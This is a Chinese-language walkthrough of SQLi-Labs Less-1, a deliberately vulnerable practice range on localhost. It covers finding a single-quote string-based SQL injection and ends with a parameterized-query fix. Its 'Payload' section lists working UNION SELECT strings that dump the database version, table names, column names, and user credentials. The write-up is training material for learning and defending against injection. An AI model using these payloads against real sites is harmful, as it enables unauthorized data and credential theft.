# SQLi-Labs | Less-1 GET 单引号字符型 报错注入
## 一、漏洞简介
GET传参id，参数被单引号包裹，存在字符型SQL注入，页面有回显，可以联合查询脱库。
## 二、环境信息
靶场地址：http://127.0.0.1/sqli-labs/
关卡路径：/Less-1/?id=1
## 三、复现步骤
1. 访问 ?id=1 正常回显；输入 ?id=1' 页面报错，确定单引号闭合
2. 测试列数：?id=1' order by 3 --+ 正常，order by 4报错，共3列
3. 找回显位置：?id=-1' union select 1,2,3 --+
4. 脱库：查询版本、库名、表名、字段、数据
## 四、Payload
查库：?id=-1' union select 1,version(),database() --+
查表：?id=-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+
查字段：?id=-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users' --+
查数据：?id=-1' union select 1,username,password from users --+
## 五、漏洞原理
后端SQL：`SELECT * FROM users WHERE id='$id' LIMIT 0,1`，参数直接拼接，无预编译。
## 六、修复方案
PDO参数化预编译查询，输入过滤。
## 七、总结
经典字符型联合注入，入门第一关，核心：单引号闭合，注释符--+。